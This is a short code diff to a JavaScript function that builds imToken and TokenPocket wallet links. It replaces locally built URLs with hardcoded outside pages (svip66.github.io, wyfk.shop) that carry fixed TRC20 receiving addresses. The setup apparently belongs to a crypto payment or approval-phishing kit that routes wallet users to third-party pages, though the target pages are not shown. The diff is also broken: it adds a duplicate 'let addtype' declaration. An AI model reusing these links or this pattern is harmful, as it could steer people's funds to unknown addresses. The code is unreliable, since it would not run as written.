@@ -94,20 +94,21 @@ function paylistloadData() {
 
 function paylistevent(from) {
 
-// let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"
+
 	
 let addtype = $("#addtype").val();
+	let addtype = $("#addtype").val();
 	let from_url = $("#from_url").val();
 	let to_address = $("#to_address").val();
 // 	let im_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
-		".html?from=" + from +
-		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
+// 		".html?from=" + from +
+// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
 
 // 	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
-		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
+// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
 
 // 	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
-		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
+// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
 	let im_url = "https://www.wyfk.shop/trc20.html?from=imToken&addtype=trc20&to_address=TQgowxJypWmNGb1fuFGd5iyM8FfW7ziV3Y&from_url=www.wyfk.shop&locale=zh-CN&utm_source=imtoken"
 let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=tokenpocket"
 let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"	
